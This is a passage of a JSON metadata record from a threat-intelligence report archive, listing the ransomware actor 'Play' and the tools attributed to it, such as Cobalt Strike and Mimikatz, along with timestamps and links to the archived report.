            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1588927474,
    "ts_modification_date": 1588927481,
    "files": {
        "pdf": "https://archive.orkl.eu/b7a6d4b3ca1bdfba16264880e37137cb4a0bf14e.pdf",
        "text": "https://archive.orkl.eu/b7a6d4b3ca1bdfba16264880e37137cb4a0bf14e.txt",
        "img": "https://archive.orkl.eu/b7a6d4b3ca1bdfba16264880e37137cb4a0bf14e.jpg"
    }
}